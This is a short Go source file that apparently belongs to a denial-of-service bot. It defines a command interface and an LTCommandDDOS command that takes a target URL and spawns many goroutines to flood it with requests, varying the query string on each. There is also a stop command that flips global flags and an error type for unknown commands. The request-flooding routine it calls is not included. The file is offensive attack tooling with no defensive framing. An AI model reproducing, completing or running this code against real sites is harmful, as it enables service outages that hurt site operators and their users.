package utils

import (
	"fmt"
	"strconv"
)

type LTCommand interface {
	GetId() (id int)
	Execute()
}

// Command DDOS
type LTCommandDDOS struct {
	Id       int
	Url      string
	Routines int
	Requests int
	Seconds  int
}

func (ltc *LTCommandDDOS) GetId() (id int) {
	return ltc.Id
}

func (ltc *LTCommandDDOS) Execute() {
	d := ddoser{}
	for i := 0; i < ltc.Routines; i++ {
		go d.PerformMultiRequest(ltc.Url+"?a="+strconv.Itoa(i), ltc.Requests)
	}
}

// Command Stop
type LTCommandStop struct {
	Id int
}

func (ltc *LTCommandStop) GetId() (id int) {
	return ltc.Id
}

func (ltc *LTCommandStop) Execute() {
	GetHelper().FL_KEEP_GOING = false
	GetHelper().FL_QUIT = true
}

// Errors
type LTCommandError struct {
	command CommandType
}

func (e LTCommandError) Error() string {
	return fmt.Sprintf("Uncknown command \"%s\"", e.command.Name)
}
